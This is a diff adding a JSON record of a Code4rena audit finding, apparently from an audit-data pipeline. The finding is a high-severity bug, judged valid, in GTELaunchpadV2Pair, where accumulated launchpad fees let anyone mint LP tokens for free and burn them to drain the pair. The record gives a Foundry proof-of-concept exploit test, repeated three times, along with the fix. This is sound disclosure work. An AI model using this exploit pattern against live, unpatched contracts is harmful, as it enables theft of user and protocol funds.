@@ -1,0 +1,138 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "GTE Perps and Launchpad_gtn2Umg6KsC",
+    "audit_uid": "gtn2Umg6KsC",
+    "requested_submission_uid": "GgTYWEonLFY",
+    "requested_finding_uid": "79A4jCP5M8X",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/GTE_Perps_and_Launchpad_gtn2Umg6KsC/20260618_145637/findings.json",
+    "source_submission_uid": "GgTYWEonLFY",
+    "source_finding_uid": "79A4jCP5M8X",
+    "original_report_path": "GTE Perps and Launchpad_gtn2Umg6KsC\\high_valid_GgTYWEonLFY.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "GgTYWEonLFY",
+  "finding_uid": "79A4jCP5M8X",
+  "finding_number": "3",
+  "title": "`GTELaunchpadV2Pair` permits minting LP tokens for free when there are non-zero accumulated launch pad fees",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "hgrano",
+  "body": "## Finding description and impact\nIn `GTELaunchpadV2Pair::mint`, the `amount0` and `amount1` of tokens provided to the contract are calculated as the difference between current balances and reserves on lines 185-188:\n\n```solidity\n        uint256 balance0 = IERC20(token0).balanceOf(address(this));\n        uint256 balance1 = IERC20(token1).balanceOf(address(this));\n        uint256 amount0 = balance0.sub(_reserve0);\n        uint256 amount1 = balance1.sub(_reserve1);\n``` \n\nThe issue is that reserves are set in the `_update` function as the current balances subtract away any accumulated fees (lines 154-155):\n\n```solidity\n        reserve0 = _reserve0 = uint112(balance0) - totalLaunchpadFee0;\n        reserve1 = _reserve1 = uint112(balance1) - totalLaunchpadFee1;\n```\n\nLet's assume a scenario where both `totalLaunchpadFee0` and `totalLaunchpadFee1` are non-zero and a user directly calls `mint` (without pre-transferring any tokens to the pair). In this case, `mint` will mistakenly calculate `amount0` and `amount1` to be the launchpad fees - the difference between current balances and reserves. There by the user will be able to mint LP tokens for free. They can repeat the call to `mint` an unlimited number of times - provided they make the calls within the same block as when the fees were received so that the launchpad fees don't get cleared. They can then cash out the stolen assets using `burn`.\n\nImpact: theft of user and protocol funds - this could end up draining all of the funds in the pair contract due to a large number of calls to the `mint` function.\n\n## Recommended mitigation steps\n\nSubtract off the accumulated launch pad fees when calculating the amount transferred in by the minter:\n\n```diff\n--- a/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n+++ b/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n@@ -184,8 +184,8 @@ contract GTELaunchpadV2Pair is IUniswapV2Pair, IGTELaunchpadV2Pair, UniswapV2ERC\n         (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n         uint256 balance0 = IERC20(token0).balanceOf(address(this));\n         uint256 balance1 = IERC20(token1).balanceOf(address(this));\n-        uint256 amount0 = balance0.sub(_reserve0);\n-        uint256 amount1 = balance1.sub(_reserve1);\n+        uint256 amount0 = balance0.sub(_reserve0).sub(accruedLaunchpadFee0);\n+        uint256 amount1 = balance1.sub(_reserve1).sub(accruedLaunchpadFee1);\n```",
+  "proof_of_concept": "Add the below test case to `LaunchpadFeePairTest` and run using `forge test --match-contract LaunchpadFeePairTest --match-test test_mintFreeLiquidity -vvv`.\n\n```solidity\n    function test_mintFreeLiquidity() public {\n        uint256 amountIn = 10 ether;\n        deal(address(base), address(this), amountIn);\n\n        // Swap from base to quote\n        (uint256 amount0Out, uint256 amount1Out) = getAmountsOut(pair, amountIn, address(base));\n        base.transfer(address(pair), amountIn);\n        pair.swap(amount0Out, amount1Out, address(this), hex\"\");\n\n        // Swap from quote to base\n        deal(address(quote), address(this), amountIn);\n        (amount0Out, amount1Out) = getAmountsOut(pair, amountIn, address(quote));\n        quote.transfer(address(pair), amountIn);\n        pair.swap(amount0Out, amount1Out, address(this), hex\"\");\n\n        // Now there are accumulated swap fees in both base and quote which can be used to mint liquidity for free\n        // Attacker can call mint as many times as they want\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker);\n        pair.mint(attacker);\n        pair.mint(attacker);\n        pair.mint(attacker);\n\n        assertGt(pair.balanceOf(attacker), 0);\n\n        // They can burn and get tokens for free\n        pair.transfer(address(pair), pair.balanceOf(attacker));\n        pair.burn(attacker);\n        assertGt(base.balanceOf(attacker), 0);\n        assertGt(quote.balanceOf(attacker), 0);\n        emit log_named_uint(\"Balance of attacker (base)\", base.balanceOf(attacker));\n        emit log_named_uint(\"Balance of attacker (quote)\", quote.balanceOf(attacker));\n    }\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol#L187-L188"
+  ],
+  "source_record": {
+    "project_id": "gtn2Umg6KsC",
+    "submission_index": "185",
+    "api_submission_id": "",
+    "uid": "GgTYWEonLFY",
+    "number": "185",
+    "title": "`GTELaunchpadV2Pair` permits minting LP tokens for free when there are non-zero accumulated launch pad fees",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "hgrano",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol#L187-L188"
+    ],
+    "body": "## Finding description and impact\nIn `GTELaunchpadV2Pair::mint`, the `amount0` and `amount1` of tokens provided to the contract are calculated as the difference between current balances and reserves on lines 185-188:\n\n```solidity\n        uint256 balance0 = IERC20(token0).balanceOf(address(this));\n        uint256 balance1 = IERC20(token1).balanceOf(address(this));\n        uint256 amount0 = balance0.sub(_reserve0);\n        uint256 amount1 = balance1.sub(_reserve1);\n``` \n\nThe issue is that reserves are set in the `_update` function as the current balances subtract away any accumulated fees (lines 154-155):\n\n```solidity\n        reserve0 = _reserve0 = uint112(balance0) - totalLaunchpadFee0;\n        reserve1 = _reserve1 = uint112(balance1) - totalLaunchpadFee1;\n```\n\nLet's assume a scenario where both `totalLaunchpadFee0` and `totalLaunchpadFee1` are non-zero and a user directly calls `mint` (without pre-transferring any tokens to the pair). In this case, `mint` will mistakenly calculate `amount0` and `amount1` to be the launchpad fees - the difference between current balances and reserves. There by the user will be able to mint LP tokens for free. They can repeat the call to `mint` an unlimited number of times - provided they make the calls within the same block as when the fees were received so that the launchpad fees don't get cleared. They can then cash out the stolen assets using `burn`.\n\nImpact: theft of user and protocol funds - this could end up draining all of the funds in the pair contract due to a large number of calls to the `mint` function.\n\n## Recommended mitigation steps\n\nSubtract off the accumulated launch pad fees when calculating the amount transferred in by the minter:\n\n```diff\n--- a/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n+++ b/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n@@ -184,8 +184,8 @@ contract GTELaunchpadV2Pair is IUniswapV2Pair, IGTELaunchpadV2Pair, UniswapV2ERC\n         (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n         uint256 balance0 = IERC20(token0).balanceOf(address(this));\n         uint256 balance1 = IERC20(token1).balanceOf(address(this));\n-        uint256 amount0 = balance0.sub(_reserve0);\n-        uint256 amount1 = balance1.sub(_reserve1);\n+        uint256 amount0 = balance0.sub(_reserve0).sub(accruedLaunchpadFee0);\n+        uint256 amount1 = balance1.sub(_reserve1).sub(accruedLaunchpadFee1);\n```",
+    "proof_of_concept": "Add the below test case to `LaunchpadFeePairTest` and run using `forge test --match-contract LaunchpadFeePairTest --match-test test_mintFreeLiquidity -vvv`.\n\n```solidity\n    function test_mintFreeLiquidity() public {\n        uint256 amountIn = 10 ether;\n        deal(address(base), address(this), amountIn);\n\n        // Swap from base to quote\n        (uint256 amount0Out, uint256 amount1Out) = getAmountsOut(pair, amountIn, address(base));\n        base.transfer(address(pair), amountIn);\n        pair.swap(amount0Out, amount1Out, address(this), hex\"\");\n\n        // Swap from quote to base\n        deal(address(quote), address(this), amountIn);\n        (amount0Out, amount1Out) = getAmountsOut(pair, amountIn, address(quote));\n        quote.transfer(address(pair), amountIn);\n        pair.swap(amount0Out, amount1Out, address(this), hex\"\");\n\n        // Now there are accumulated swap fees in both base and quote which can be used to mint liquidity for free\n        // Attacker can call mint as many times as they want\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker);\n        pair.mint(attacker);\n        pair.mint(attacker);\n        pair.mint(attacker);\n\n        assertGt(pair.balanceOf(attacker), 0);\n\n        // They can burn and get tokens for free\n        pair.transfer(address(pair), pair.balanceOf(attacker));\n        pair.burn(attacker);\n        assertGt(base.balanceOf(attacker), 0);\n        assertGt(quote.balanceOf(attacker), 0);\n        emit log_named_uint(\"Balance of attacker (base)\", base.balanceOf(attacker));\n        emit log_named_uint(\"Balance of attacker (quote)\", quote.balanceOf(attacker));\n    }\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/gtn2Umg6KsC/submissions/185",
+    "raw": {
+      "auditUid": "gtn2Umg6KsC",
+      "createdAt": "2025-09-07T07:19:48.279Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "tNdsttVsT5k",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-08T13:30:51.987Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "79A4jCP5M8X"
+        },
+        {
+          "uid": "7UuYhEHjCw2",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-08T13:30:52.579Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "GgTYWEonLFY",
+          "findingUid": null
+        },
+        {
+          "uid": "zjEobxtbHDT",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-08T13:30:53.398Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "79A4jCP5M8X"
+        },
+        {
+          "uid": "XdSdK5drDP9",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-08T13:30:54.062Z",
+          "type": "rank",
+          "value": "1",
+          "submissionUid": "GgTYWEonLFY",
+          "findingUid": null
+        },
+        {
+          "uid": "rhoUNxW2sik",
+          "userUid": "S427KbaYy5Q",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-10-06T17:37:46.563Z",
+          "type": "validity",
+          "value": "fixed",
+          "submissionUid": null,
+          "findingUid": "79A4jCP5M8X"
+        }
+      ],
+      "finding": {
+        "uid": "79A4jCP5M8X",
+        "number": 3,
+        "duplicates": 16
+      },
+      "isPrimary": true,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": "1",
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2025-11-10T13:08:25.616Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "`GTELaunchpadV2Pair` permits minting LP tokens for free when there are non-zero accumulated launch pad fees",
+      "uid": "GgTYWEonLFY",
+      "updatedAt": "2025-09-07T07:19:48.279Z",
+      "user": {
+        "uid": "ixoNvCvKWek",
+        "handle": "hgrano"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\nIn `GTELaunchpadV2Pair::mint`, the `amount0` and `amount1` of tokens provided to the contract are calculated as the difference between current balances and reserves on lines 185-188:\n\n```solidity\n        uint256 balance0 = IERC20(token0).balanceOf(address(this));\n        uint256 balance1 = IERC20(token1).balanceOf(address(this));\n        uint256 amount0 = balance0.sub(_reserve0);\n        uint256 amount1 = balance1.sub(_reserve1);\n``` \n\nThe issue is that reserves are set in the `_update` function as the current balances subtract away any accumulated fees (lines 154-155):\n\n```solidity\n        reserve0 = _reserve0 = uint112(balance0) - totalLaunchpadFee0;\n        reserve1 = _reserve1 = uint112(balance1) - totalLaunchpadFee1;\n```\n\nLet's assume a scenario where both `totalLaunchpadFee0` and `totalLaunchpadFee1` are non-zero and a user directly calls `mint` (without pre-transferring any tokens to the pair). In this case, `mint` will mistakenly calculate `amount0` and `amount1` to be the launchpad fees - the difference between current balances and reserves. There by the user will be able to mint LP tokens for free. They can repeat the call to `mint` an unlimited number of times - provided they make the calls within the same block as when the fees were received so that the launchpad fees don't get cleared. They can then cash out the stolen assets using `burn`.\n\nImpact: theft of user and protocol funds - this could end up draining all of the funds in the pair contract due to a large number of calls to the `mint` function.\n\n## Recommended mitigation steps\n\nSubtract off the accumulated launch pad fees when calculating the amount transferred in by the minter:\n\n```diff\n--- a/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n+++ b/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n@@ -184,8 +184,8 @@ contract GTELaunchpadV2Pair is IUniswapV2Pair, IGTELaunchpadV2Pair, UniswapV2ERC\n         (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n         uint256 balance0 = IERC20(token0).balanceOf(address(this));\n         uint256 balance1 = IERC20(token1).balanceOf(address(this));\n-        uint256 amount0 = balance0.sub(_reserve0);\n-        uint256 amount1 = balance1.sub(_reserve1);\n+        uint256 amount0 = balance0.sub(_reserve0).sub(accruedLaunchpadFee0);\n+        uint256 amount1 = balance1.sub(_reserve1).sub(accruedLaunchpadFee1);\n```",
+      "proofOfConcept": "Add the below test case to `LaunchpadFeePairTest` and run using `forge test --match-contract LaunchpadFeePairTest --match-test test_mintFreeLiquidity -vvv`.\n\n```solidity\n    function test_mintFreeLiquidity() public {\n        uint256 amountIn = 10 ether;\n        deal(address(base), address(this), amountIn);\n\n        // Swap from base to quote\n        (uint256 amount0Out, uint256 amount1Out) = getAmountsOut(pair, amountIn, address(base));\n        base.transfer(address(pair), amountIn);\n        pair.swap(amount0Out, amount1Out, address(this), hex\"\");\n\n        // Swap from quote to base\n        deal(address(quote), address(this), amountIn);\n        (amount0Out, amount1Out) = getAmountsOut(pair, amountIn, address(quote));\n        quote.transfer(address(pair), amountIn);\n        pair.swap(amount0Out, amount1Out, address(this), hex\"\");\n\n        // Now there are accumulated swap fees in both base and quote which can be used to mint liquidity for free\n        // Attacker can call mint as many times as they want\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker);\n        pair.mint(attacker);\n        pair.mint(attacker);\n        pair.mint(attacker);\n\n        assertGt(pair.balanceOf(attacker), 0);\n\n        // They can burn and get tokens for free\n        pair.transfer(address(pair), pair.balanceOf(attacker));\n        pair.burn(attacker);\n        assertGt(base.balanceOf(attacker), 0);\n        assertGt(quote.balanceOf(attacker), 0);\n        emit log_named_uint(\"Balance of attacker (base)\", base.balanceOf(attacker));\n        emit log_named_uint(\"Balance of attacker (quote)\", quote.balanceOf(attacker));\n    }\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol#L187-L188",
+      "number": 185,
+      "aiExplanation": null,
+      "_index": 185
+    }
+  }
+}
